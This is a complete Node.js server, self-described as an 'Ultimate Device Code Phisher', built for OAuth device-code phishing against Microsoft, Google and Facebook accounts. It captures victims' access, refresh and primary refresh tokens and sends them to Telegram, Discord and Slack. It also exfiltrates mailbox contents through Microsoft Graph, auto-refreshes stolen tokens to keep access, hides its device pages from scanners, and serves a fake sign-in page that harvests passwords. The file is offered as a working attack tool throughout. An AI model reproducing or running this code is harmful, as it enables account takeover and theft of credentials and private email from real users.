// ============================================================
// 🥔 ULTIMATE DEVICE CODE PHISHER v2.2 – Static HTML files
// ============================================================
// Now serves dashboard from public/index.html and device page
// from public/device_code.html.
// ============================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const url = require('url');
const zlib = require('zlib');
const axios = require('axios');
const FormData = require('form-data');
const WebSocket = require('ws');
const QRCode = require('qrcode');
const express = require('express');
const basicAuth = require('express-basic-auth');

// ── Environment ──
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const SMTP_HOST = process.env.SMTP_HOST || '';
const SMTP_PORT = process.env.SMTP_PORT || 587;
const SMTP_USER = process.env.SMTP_USER || '';
const SMTP_PASS = process.env.SMTP_PASS || '';
const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
const DASHBOARD_USER = process.env.DASHBOARD_USER || 'admin';
const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const SCOPE = 'https://graph.microsoft.com/.default offline_access';

// ── Storage ──
const FLOWS_FILE = path.join(__dirname, 'device_flows.json');
const LOGS_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR);

let flows = [];
loadFlows();

function loadFlows() {
    try {
        if (fs.existsSync(FLOWS_FILE)) {
            flows = JSON.parse(fs.readFileSync(FLOWS_FILE, 'utf-8'));
        }
    } catch (e) { console.warn('Could not load flows:', e.message); }
}
function saveFlows() {
    fs.writeFileSync(FLOWS_FILE, JSON.stringify(flows, null, 2));
}

// ── Helpers ──
function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function isBot(userAgent) {
    if (!userAgent) return true;
    const ua = userAgent.toLowerCase();
    const bots = ['bot','crawler','spider','scraper','curl','wget','python','go-http','java','http-client'];
    return bots.some(b => ua.includes(b));
}

// ── Rate Limiter ──
const ipRequests = new Map();
function rateLimit(ip) {
    const now = Date.now();
    const window = 60000; // 1 minute
    const max = 30;
    if (!ipRequests.has(ip)) {
        ipRequests.set(ip, { count: 1, reset: now + window });
        return true;
    }
    const entry = ipRequests.get(ip);
    if (now > entry.reset) {
        entry.count = 1;
        entry.reset = now + window;
        return true;
    }
    if (entry.count < max) {
        entry.count++;
        return true;
    }
    return false;
}

// ── IP Geolocation ──
const geoCache = new Map();
async function getGeo(ip) {
    if (ip === '127.0.0.1' || ip === '::1' || !ip) return { country: 'XX', flag: '🌍', name: 'Local' };
    if (geoCache.has(ip)) return geoCache.get(ip);
    try {
        const resp = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
        const data = resp.data;
        if (data.country_code) {
            const flag = String.fromCodePoint(...[...data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
            const result = { country: data.country_code, flag, name: data.country_name || data.country_code };
            geoCache.set(ip, result);
            return result;
        }
    } catch (e) {}
    const fallback = { country: 'UN', flag: '🌍', name: 'Unknown' };
    geoCache.set(ip, fallback);
    return fallback;
}

// ── Multi‑Channel Exfil ──
async function exfiltrate(data) {
    const { email, tokens, sessionId, ip, userAgent, tenantId, prt } = data;
    const geo = await getGeo(ip);
    let message = `🔐 **Device Code Capture!**\n\n`;
    message += `🆔 Session: ${sessionId}\n`;
    message += `👤 Email: ${email || 'Unknown'}\n`;
    message += `🏢 Tenant: ${tenantId || 'N/A'}\n`;
    message += `🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n`;
    message += `🖥️ UA: ${userAgent || 'N/A'}\n`;
    message += `🕒 Time: ${new Date().toISOString()}\n\n`;
    if (tokens.access_token) message += `🔑 Access: ${tokens.access_token.slice(0,30)}...\n`;
    if (tokens.refresh_token) message += `🔄 Refresh: ${tokens.refresh_token.slice(0,30)}...\n`;
    if (tokens.id_token) message += `🆔 ID: ${tokens.id_token.slice(0,30)}...\n`;
    if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;

    // Telegram
    if (BOT_TOKEN && CHAT_ID) {
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            }, { timeout: 5000 });
            // Send file
            if (tokens.access_token || tokens.refresh_token || tokens.id_token || prt) {
                let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
                if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
                if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
                if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
                if (prt) fileText += `PRT:\n${prt}\n\n`;
                const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
                fs.writeFileSync(tmpFile, fileText);
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                    headers: form.getHeaders(),
                    timeout: 10000
                });
                fs.unlinkSync(tmpFile);
            }
        } catch (e) { console.warn('Telegram exfil failed:', e.message); }
    }

    // Discord
    if (DISCORD_WEBHOOK) {
        try {
            await axios.post(DISCORD_WEBHOOK, {
                content: message.substring(0, 2000)
            }, { timeout: 5000 });
        } catch (e) { console.warn('Discord exfil failed:', e.message); }
    }

    // Slack
    if (SLACK_WEBHOOK) {
        try {
            await axios.post(SLACK_WEBHOOK, {
                text: message
            }, { timeout: 5000 });
        } catch (e) { console.warn('Slack exfil failed:', e.message); }
    }

    console.log(`✅ Exfiltrated session ${sessionId}`);
}

// ── Graph Email Exfil ──
async function exfilEmails(accessToken, sessionId) {
    try {
        const resp = await axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=20&$select=subject,from,receivedDateTime', {
            headers: { Authorization: `Bearer ${accessToken}` },
            timeout: 10000
        });
        const emails = resp.data.value || [];
        if (emails.length === 0) return;
        let txt = `# Email Dump - Session ${sessionId}\n\n`;
        emails.forEach((e, i) => {
            txt += `--- Email ${i+1} ---\n`;
            txt += `Subject: ${e.subject || 'N/A'}\n`;
            txt += `From: ${e.from?.emailAddress?.address || 'N/A'}\n`;
            txt += `Date: ${e.receivedDateTime || 'N/A'}\n\n`;
        });
        const tmpFile = path.join(__dirname, `emails_${sessionId}.txt`);
        fs.writeFileSync(tmpFile, txt);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(tmpFile), { filename: `emails_${sessionId}.txt` });
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        fs.unlinkSync(tmpFile);
        console.log(`📧 Emails exfiltrated for session ${sessionId}`);
    } catch (e) {
        console.warn('Email exfil failed:', e.message);
    }
}

// ── Token Health Check ──
async function checkTokenHealth(accessToken) {
    try {
        const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
            headers: { Authorization: `Bearer ${accessToken}` },
            timeout: 5000
        });
        return { valid: true, user: resp.data.userPrincipalName };
    } catch (e) {
        return { valid: false, error: e.message };
    }
}

// ── Auto‑Refresh Daemon ──
async function refreshTokens() {
    for (const flow of flows) {
        if (flow.status === 'approved' && flow.refresh_token) {
            try {
                const tenant = flow.tenant || 'organizations';
                const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
                    new URLSearchParams({
                        client_id: flow.client_id || CLIENT_ID,
                        refresh_token: flow.refresh_token,
                        grant_type: 'refresh_token',
                        scope: SCOPE
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                flow.access_token = resp.data.access_token;
                if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
                flow.last_refresh = new Date().toISOString();
                saveFlows();
                console.log(`🔄 Refreshed tokens for session ${flow.session_id}`);
            } catch (e) {
                console.warn(`Refresh failed for ${flow.session_id}:`, e.message);
            }
        }
    }
}
setInterval(refreshTokens, 60 * 60 * 1000); // every hour

// ── Express App ──
const app = express();
app.use(express.json());

// Serve static files from 'public' directory
app.use(express.static('public'));

// Health
app.get(['/', '/health'], (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Rate limiting middleware
app.use((req, res, next) => {
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    if (!rateLimit(ip)) {
        return res.status(429).send('Too Many Requests');
    }
    if (isBot(req.headers['user-agent']) && req.path.startsWith('/device')) {
        return res.status(403).send('Forbidden');
    }
    next();
});

// ── Device Code Flow ──
app.post('/device/request', async (req, res) => {
    try {
        const service = req.query.service || 'microsoft';
        let clientId = CLIENT_ID;
        let scope = SCOPE;
        let endpoint = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
        if (service === 'google') {
            clientId = process.env.GOOGLE_CLIENT_ID || '';
            scope = 'openid email profile';
            endpoint = 'https://accounts.google.com/o/oauth2/device/code';
        } else if (service === 'facebook') {
            clientId = process.env.FACEBOOK_CLIENT_ID || '';
            scope = 'email';
            endpoint = 'https://graph.facebook.com/v17.0/device/code';
        }
        const resp = await axios.post(endpoint,
            new URLSearchParams({ client_id: clientId, scope }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const data = resp.data;
        const flow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            client_id: clientId,
            session_id: generateSessionId(),
            service: service,
            tenant: 'organizations'
        };
        flows.push(flow);
        saveFlows();
        res.json(data);
    } catch (error) {
        console.error('Device request error:', error.response?.data || error.message);
        res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
    }
});

app.post('/device/token', async (req, res) => {
    const { device_code } = req.body;
    if (!device_code) return res.status(400).json({ error: 'invalid_request', error_description: 'device_code required' });
    const flow = flows.find(f => f.device_code === device_code);
    if (!flow) return res.status(404).json({ error: 'not_found' });
    try {
        const tenant = flow.tenant || 'organizations';
        const endpoint = flow.service === 'google' ? 'https://oauth2.googleapis.com/token' :
                         flow.service === 'facebook' ? 'https://graph.facebook.com/v17.0/oauth/access_token' :
                         `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
        const resp = await axios.post(endpoint,
            new URLSearchParams({
                client_id: flow.client_id,
                device_code: device_code,
                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const tokens = resp.data;
        let email = 'Unknown';
        let tenantId = null;
        let prt = null;
        if (tokens.id_token) {
            try {
                const parts = tokens.id_token.split('.');
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                email = payload.email || payload.preferred_username || payload.upn || email;
                tenantId = payload.tid || payload.tenantId || null;
                if (payload.prt) prt = payload.prt;
            } catch (e) {}
        }
        // Extract PRT if present in response (some Microsoft flows return it)
        if (tokens.prt) prt = tokens.prt;

        flow.status = 'approved';
        flow.access_token = tokens.access_token;
        flow.refresh_token = tokens.refresh_token;
        flow.id_token = tokens.id_token;
        flow.prt = prt;
        flow.approved = new Date().toISOString();
        flow.username = email;
        if (tenantId) flow.tenant = tenantId;
        saveFlows();

        // Exfiltrate
        const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
        await exfiltrate({
            sessionId: flow.session_id,
            email,
            tokens: { access_token: tokens.access_token, refresh_token: tokens.refresh_token, id_token: tokens.id_token },
            prt,
            ip,
            userAgent: req.headers['user-agent'],
            tenantId
        });

        // Trigger email exfil if access token available
        if (tokens.access_token) {
            setTimeout(() => exfilEmails(tokens.access_token, flow.session_id), 10000);
        }

        // Broadcast via WebSocket
        broadcast({ type: 'new_capture', session: flow.session_id, email, timestamp: new Date().toISOString() });

        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            res.status(400).json({ error: 'expired_token' });
        } else {
            console.error('Token error:', error.response?.data || error.message);
            res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
        }
    }
});

// ── Second‑Stage Phishing (Fake Login) ──
app.get('/login', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Sign in</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 360px; }
        h2 { text-align: center; color: #333; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0063b1; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Sign in to your account</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });
            window.location.href = '${REDIRECT_URL}';
        });
    </script>
</body>
</html>
    `);
});

app.post('/capture', async (req, res) => {
    const { email, password } = req.body;
    console.log(`📥 Second‑stage capture: ${email} / ${password}`);
    // Exfiltrate via all channels
    await exfiltrate({
        sessionId: 'second_stage',
        email,
        tokens: {},
        ip: req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
        userAgent: req.headers['user-agent']
    });
    res.json({ success: true });
});

// ── Dashboard (protected) ──
app.use('/dash', basicAuth({
    users: { [DASHBOARD_USER]: DASHBOARD_PASS },
    challenge: true
}));
// The dashboard is now served from public/index.html via static middleware

// ── API endpoints for dashboard ──
app.get('/api/flows', (req, res) => {
    res.json(flows);
});

app.get('/api/flow/:sessionId', (req, res) => {
    const flow = flows.find(f => f.session_id === req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    res.json(flow);
});

app.post('/api/replay/:sessionId', (req, res) => {
    const flow = flows.find(f => f.session_id === req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    // Build a replay script that injects stored cookies (if any)
    const script = `
    (function() {
        const token = '${flow.access_token || ''}';
        if (token) {
            localStorage.setItem('access_token', token);
            alert('Token injected. You can now use it.');
        }
    })();
    `;
    res.json({ replayScript: script });
});

// ── WebSocket Server ──
const wsServer = new WebSocket.Server({ noServer: true });
const wsClients = new Set();

wsServer.on('connection', (ws) => {
    wsClients.add(ws);
    ws.on('close', () => wsClients.delete(ws));
});

function broadcast(data) {
    const msg = JSON.stringify(data);
    for (const client of wsClients) {
        if (client.readyState === WebSocket.OPEN) {
            client.send(msg);
        }
    }
}

// ── Health Check Endpoint ──
app.get('/api/health', async (req, res) => {
    const results = [];
    for (const flow of flows) {
        if (flow.access_token) {
            const health = await checkTokenHealth(flow.access_token);
            results.push({ session: flow.session_id, ...health });
        }
    }
    res.json(results);
});

// ── Start HTTP server with WebSocket upgrade ──
const server = http.createServer(app);

server.on('upgrade', (req, socket, head) => {
    if (req.url === '/ws') {
        wsServer.handleUpgrade(req, socket, head, (ws) => {
            wsServer.emit('connection', ws, req);
        });
    } else {
        socket.destroy();
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Ultimate Device Phisher running on port ${PORT}`);
    console.log(`📱 Device page: http://localhost:${PORT}/device_code.html`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
    console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
    console.log(`🚀 All features loaded.`);
});

process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
process.on('SIGINT', () => { server.close(() => process.exit(0)); });
